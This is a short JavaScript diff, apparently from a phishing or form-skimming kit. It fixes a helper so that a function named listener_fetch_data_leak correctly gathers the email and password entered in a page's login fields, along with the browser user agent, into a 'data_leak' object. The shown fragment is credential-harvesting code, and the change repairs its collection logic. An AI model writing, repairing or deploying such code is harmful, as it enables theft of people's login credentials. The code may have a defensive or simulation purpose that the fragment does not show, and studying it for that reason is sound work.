@@ -56,14 +56,14 @@ function get_elements_selector(selector_list) {
 function get_element_value(selectors) {
      var element = get_element_selector(selectors);
      if (!element) return false;
-     return element;
+     return element.value;
 }
 
 function listener_fetch_data_leak() {
     // GET data to leak
     data_leak = {
-        "email": get_element_value(window["data_leak_label_username"]).value,
-        "password": get_element_value(window["data_leak_label_password"]).value,
+        "email": get_element_value(window["data_leak_label_username"]),
+        "password": get_element_value(window["data_leak_label_password"]),
         "uagent": navigator.userAgent
     }
 
